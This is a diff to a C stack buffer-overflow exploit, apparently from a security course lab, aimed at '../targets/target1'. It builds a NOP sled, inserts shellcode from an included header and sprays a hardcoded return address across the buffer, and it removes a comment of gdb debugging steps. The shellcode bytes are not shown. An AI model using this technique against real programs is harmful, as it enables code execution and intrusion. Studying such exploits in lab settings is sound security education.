@@ -5,13 +5,14 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target1"
-#define TARGET_ADDR 0x40a4fe40
-#define TARGET_ADDR_0 0x40
+#define TARGET_ADDR 0x40a4fe10
+#define TARGET_ADDR_0 0x10
 #define TARGET_ADDR_1 0xfe
 #define TARGET_ADDR_2 0xa4
 #define TARGET_ADDR_3 0x40
 #define BUFSIZE 140 
 #define SHELLSIZE 45
+#define NOPSIZE 32
 int
 main ( int argc, char * argv[] )
 {
@@ -22,12 +23,23 @@ main ( int argc, char * argv[] )
 	for (i = 0; i < BUFSIZE; i++){
 		attackBuffer[i] = 0x90;
 	}
-	attackBuffer[BUFSIZE - 4] = TARGET_ADDR_0;
-	attackBuffer[BUFSIZE - 3] = TARGET_ADDR_1;
-	attackBuffer[BUFSIZE - 2] = TARGET_ADDR_2;
-	attackBuffer[BUFSIZE - 1] = TARGET_ADDR_3;
+	//attackBuffer[BUFSIZE - 4] = TARGET_ADDR_0;
+	//attackBuffer[BUFSIZE - 3] = TARGET_ADDR_1;
+	//attackBuffer[BUFSIZE - 2] = TARGET_ADDR_2;
+	//attackBuffer[BUFSIZE - 1] = TARGET_ADDR_3;
 	for (i = 0; i < SHELLSIZE; i++){
-		attackBuffer[i] = shellcode[i];
+		attackBuffer[NOPSIZE + i] = shellcode[i];
+	}
+	for (i = NOPSIZE + SHELLSIZE + 4 - SHELLSIZE%4; i < BUFSIZE; i++){
+		if(i%4==0){
+			attackBuffer[i] = TARGET_ADDR_0;
+		}else if(i%4==1){
+			attackBuffer[i] = TARGET_ADDR_1;
+		}else if(i%4==2){
+			attackBuffer[i] = TARGET_ADDR_2;
+		}else{
+			attackBuffer[i] = TARGET_ADDR_3;
+		}
 	}
 	//attackBuffer[BUFSIZE] = '\0';
 
@@ -42,16 +54,3 @@ main ( int argc, char * argv[] )
 
 	return (0);
 }
-/*
-set follow-fork-mode child
-b main
-run
-c
-b lab_main
-c
-info frame
-p &buf
-
-set {int}0x40a4fecc = 0
-
-*/
